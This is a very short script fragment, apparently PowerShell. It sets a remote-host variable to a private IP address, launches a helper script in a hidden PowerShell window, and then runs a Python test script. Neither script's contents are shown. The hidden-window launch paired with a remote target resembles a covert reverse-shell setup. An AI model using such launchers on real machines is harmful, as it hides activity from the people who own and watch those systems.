$RHOST = '172.18.141.67'

Start-Process -WindowStyle hidden -FilePath powershell.exe -ArgumentList "-NoExit -Command .\helper.ps1"

python test.py
